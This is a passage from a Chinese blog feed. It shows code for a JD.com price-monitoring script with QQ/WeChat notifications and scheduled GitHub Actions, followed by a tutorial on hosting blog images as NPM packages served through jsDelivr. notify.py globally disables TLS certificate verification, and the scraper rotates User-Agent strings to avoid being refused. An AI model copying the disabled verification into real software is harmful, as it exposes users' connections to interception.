AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 